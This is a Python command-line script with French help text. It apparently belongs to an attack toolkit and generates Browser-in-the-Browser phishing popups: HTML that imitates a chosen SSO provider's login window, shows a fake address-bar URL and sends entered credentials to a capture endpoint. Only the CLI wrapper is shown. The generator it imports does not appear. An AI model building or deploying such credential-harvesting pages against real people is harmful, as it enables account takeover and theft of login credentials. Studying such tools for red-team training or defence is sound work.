from __future__ import annotations

import argparse
import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from attack.bitb.generator import BitBTarget, generate_bitb_popup, list_targets


def main() -> int:
    parser = argparse.ArgumentParser(
        description="BitB Popup Generator - Génère du HTML de popup SSO spoofée",
    )
    parser.add_argument(
        "--target",
        "-t",
        type=str,
        required=True,
        choices=[t.value for t in BitBTarget],
        help=f"Cible SSO à imiter ({len(list_targets())} cibles: {', '.join(list_targets())})",
    )
    parser.add_argument(
        "--output",
        "-o",
        type=str,
        required=True,
        help="Fichier de sortie HTML",
    )
    parser.add_argument(
        "--capture-endpoint",
        type=str,
        default="/_/bitb/capture",
        help="Endpoint de capture des credentials (defaut: /_/bitb/capture)",
    )
    parser.add_argument(
        "--fake-url",
        type=str,
        default=None,
        help="URL factice affichée dans la barre d'adresse (defaut: selon cible)",
    )
    args = parser.parse_args()

    html = generate_bitb_popup(
        target=args.target,
        capture_endpoint=args.capture_endpoint,
        fake_url=args.fake_url,
    )

    out_path = Path(args.output)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(html, encoding="utf-8")
    print(f"✅ BitB popup générée: {out_path} ({len(html)} octets)")
    print(f"   Cible: {args.target}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
